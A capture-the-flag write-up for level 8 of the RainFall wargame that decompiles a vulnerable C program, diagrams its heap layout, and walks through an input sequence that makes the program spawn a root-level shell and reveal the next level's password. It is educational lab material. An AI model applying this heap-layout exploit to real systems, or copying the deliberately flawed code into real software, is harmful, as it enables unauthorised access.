# Level 8

<h3>source.c</h3>

```console
char	*auth = NULL;
char	*service = NULL;

int main(int argc, char** argv) {
  char str[128];

  while(1) {
    printf("%p, %p \n", edx, ecx);

    if (fgets(str, 128, stdin) == 0) {
      break;
    }
    if (strncmp(str, "auth ", 5) == 0) {
      auth = malloc(4);
      auth[0] = 0;
      if (strlen(str + 5) <= 30) {
        strcpy(auth, str + 5);
      }
    }
    if (strncmp(str, "reset", 5) == 0) {
      free(auth);
    }
    if (strncmp(str, "service", 6) == 0) {
      service = strdup(str + 7);
    }
    if (strncmp(str, "login", 5) == 0) {
      if (auth[32] != 0) {
        system("/bin/sh");
      }
      else {
        fwrite("Password:\n", 1, 10, stdout);
      }
    }
  }

  return (0);
}
```

<h3>Step</h3>

For this program, the harder part would be the long `main()` in the asm form

After reserving it to c code, we can see that it is doing a infinite loop that only break if `fgets()` returns 0

Each loop will start by printing the address of the global variable `auth` and `service`

Next it will check for the input and do action according to the input given

Our goal this time will be to make `auth[32] != 0` so that it will call `system("/bin/sh")`

<h3>Exploit</h3>

```console
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
```

Base on the analysis above, lets visualize the state of the `heap`

```console

1st malloc call (auth = malloc(4))

            +-----------+                                -> 8 bytes reserve for auth, even if the program only ask for 4 bytes memory,
            |   auth    |                                   malloc will give the memory base by the multiplier of 8,
    +-------------------+                                   so it reserve 8 bytes instead, at this point, we could possibly write
    | M | B | 8 bytes   |                                   `auth 12345678123456781234567812345678` as the next line will do strcpy on the 5th input onward
    +-------------------+                                   but there is a condition that we could only copy if the len is 30bytes, so this plan won't work 
0x804a008__/

2nd malloc call (service = strdup(str + 7))

            +-----------+   +-----------+
            |   auth    |   |  service  |                -> n bytes reserve for service requested by strdup,
    +-------------------------------------------------+     here we can see that `auth[32]` will landed somewhere in the memory area reserve for service
    | M | B | 8 bytes   | B | bytes request by strdup |     8 bytes (auth own area) + 8 bytes (service block metadata) = 16 bytes,
    +-------------------------------------------------+     so we need to write another 16 bytes into service memory area so that `auth[32]` will be filled
0x804a008__/    0x804a018__/

```

```console
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service0123456789abcdef
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```